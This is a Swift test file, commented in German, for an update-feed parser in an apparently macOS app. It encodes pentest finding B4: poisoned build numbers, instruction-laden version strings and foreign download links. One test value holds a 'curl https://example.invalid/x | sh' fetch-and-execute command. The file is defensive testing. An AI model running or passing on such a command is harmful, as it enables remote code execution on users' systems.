import Foundation
import Testing
@testable import ManagerKit

/// Penetrationstests (Audit 2026-10-09, Befund B4): Feldwerte des Update-Feeds werden nicht auf Plausibilität geprüft.
/// Voraussetzung ist ein kompromittierter Webhost (TLS und Host-Bindung sind in Ordnung, ein manipuliertes DMG
/// scheitert an Signatur und Notarisierung). Zwei Folgen bleiben trotzdem:
///
/// - Ein absurder Build (`Int.max`) wird als „gemeldet“ gespeichert; danach meldet keine Installation je wieder ein
///   echtes Update per Systembenachrichtigung – auch nicht nach Bereinigung des Hosts.
/// - `shortVersionString` ist freier Text bis 4 KiB und landet in Benachrichtigung, Banner und `NSAlert`
///   („Grantry <Text> ist verfügbar“) – ein Kanal für Anweisungen, die Gatekeeper umgehen („Terminal öffnen und …“).
@Suite struct PenetrationUpdateFeedTests {
    private func items(version: String = "2026.10.5", build: String) throws -> [AppcastItem] {
        try AppcastParser.items(from: AppcastParserTests.feed(AppcastParserTests.item(version: version, build: build)))
    }

    /// Befund B4a: Nach einem vergifteten Build muss ein echter, neuerer Build weiterhin gemeldet werden – entweder
    /// weil der absurde Wert gar nicht erst als Eintrag gilt oder weil der Merkstand nicht unerreichbar hoch bleibt.
    @Test func absurdBuildDoesNotSilenceFutureNotifications() throws {
        let preferences = UpdatePreferences(store: InMemorySettingsStore())
        if let poisoned = try items(build: String(Int.max)).first {
            _ = preferences.claimNotification(for: poisoned)
        }
        let genuine = try #require(try items(build: "300").first)
        #expect(preferences.claimNotification(for: genuine))
    }

    /// Befund B4b: Ein Versionstext mit Anweisungen ist keine Version.
    @Test func versionTextWithInstructionsIsRejected() throws {
        let version = "2026.11.1 – Terminal öffnen und curl https://example.invalid/x | sh ausführen"
        let parsed = try items(version: version, build: "9999")
        #expect(parsed.isEmpty)
    }

    /// Gegenprobe (heute korrekt): Download- und Release-Notes-Links außerhalb des Hosts verwerfen den Eintrag.
    @Test(arguments: ["http://grantry.cstrube.de/x.dmg", "https://evil.example/x.dmg", "file:///tmp/x.dmg", "https://grantry.cstrube.de:8443/x.dmg"])
    func foreignDownloadLinksAreRejected(_ download: String) throws {
        let parsed = try AppcastParser.items(from: AppcastParserTests.feed(AppcastParserTests.item(download: download)))
        #expect(parsed.isEmpty, "\(download)")
    }
}
